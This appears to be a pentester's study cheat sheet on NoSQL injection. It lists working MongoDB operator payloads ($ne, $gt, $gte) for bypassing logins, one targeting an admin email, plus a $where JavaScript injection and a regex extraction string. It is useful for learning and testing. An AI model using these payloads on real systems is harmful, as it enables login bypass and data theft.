# NoSQL
## Types of injections
- **In-Band** - the attacker can use the same channel of communication to exploit a NoSQL injection and receive the results
- **Blind** - This is when the attacker does not receive any direct results from the NoSQL injection, but they can infer results based on how the server responds
- **Boolean** - Boolean-based is a subclass of blind injections, which is a technique where attackers can force the server to evaluate a query and return one result or the other if it is True or False
- **Time-Based** - Time-based is the other subclass of blind injections, which is when attackers make the server wait for a specific amount of time before responding, usually to indicate if the query is evaluated as True or False

## PHP Syntax
|PHP query|Mongo Query|Description|
|-|-|-|
|`param[$op]=val`|`param: {$op: val}`||
|`email[$ne]=test@test.com`|`email: {$ne: "test@test.com"}`||
|`email=admin%40mangomail.com&password[$ne]=x`|`$and:[{email:"admin@mangomail.com"}, {password: {$ne: x}}]`|This assumes we know the admin's email and we wanted to target them directly|
|`email[$gt]=&password[$gt]=`|`$and: [{email: {$gt:0}}, {password: {$gt:0}}]`|Any string is 'greater than' an empty string|
|`email[$gte]=&password[$gte]=`|`$and: [{email: {$gte:0}}, {password: {$gte:0}}]`|Any string is 'greater than' an empty string|

## NoSQL queries
|Query|Description|
|-|-|
|`name: {$ne: 'doesntExist'}`|Assuming doesntExist doesn't match any documents' names, this will match all documents|
|`name: {$gt: ''}`|This matches all documents whose name is 'bigger' than an empty string|
|`name: {$gte: ''}`|This matches all documents whose name is 'bigger or equal to' an empty string|
|`name: {$lt: '~'}`|This compares the first character of name to a Tilde character and matches if it is 'less'. This will not always work, but it works in this case because Tilde is the largest printable ASCII value, and we know that all names in the collection are composed of ASCII characters|
|`name: {$lte: '~'}`|Same logic as above, except it additionally matches documents whose names start with ~|

## Server-Side JavaScript Injection
1. Set username to `" || true || ""=="`
2. The result ```db.users.find({
    $where: 'this.username === "" || true || ""=="" && this.password === "<password>"'
});```

### To exfiltrate data
`" || (this.username.match('^.*')) || ""==" `

## NB
**Если в приложении вызывается функция `where`, то она потенциально может привести к NoSQLi`**